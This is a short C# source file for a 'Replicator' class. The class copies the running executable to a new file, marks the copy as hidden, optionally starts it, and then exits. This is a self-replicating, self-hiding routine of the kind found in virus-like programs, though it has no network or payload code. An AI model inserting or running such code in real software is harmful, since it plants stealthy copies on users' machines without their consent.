using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Library
{
    public class Replicator
    {
        private uint c = 0; // Version (copy count)
        private static Replicator instance;

        public static Replicator Instance
        {
            get
            {
                lock (typeof(Replicator))
                {
                    if (instance == null)
                    {
                        instance = new Replicator();
                    }
                    return instance;
                }
            }
        }

        private Replicator() { }

        public void Replicate(bool autostart)
        {
            String pn = Clone();
            if (autostart)
            {
                Start(pn, ProcessWindowStyle.Normal);
            }
            Environment.Exit(0);
        }

        /// <summary>
        /// http://stackoverflow.com/questions/616584/how-do-i-get-the-name-of-the-current-executable-in-c
        /// </summary>
        /// <returns></returns>
        string Clone()
        {
            c++;
            String newName = AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "") + " (" + c + ").exe";
            try
            {
                File.Copy(AppDomain.CurrentDomain.FriendlyName, newName);
                new FileInfo(newName) { Attributes = FileAttributes.Hidden }; // Hide the file
            }
            catch (IOException)
            {
                Clone();
            }
            return newName;
        }

        Process Start(string file, ProcessWindowStyle windowStyle)
        {
            ProcessStartInfo psi = new ProcessStartInfo(file)
            {
                WindowStyle = windowStyle,
                UseShellExecute = true
            };
            Process p = new Process()
            {
                StartInfo = psi
            };
            p.Start();
            return p;
        }
    }
}
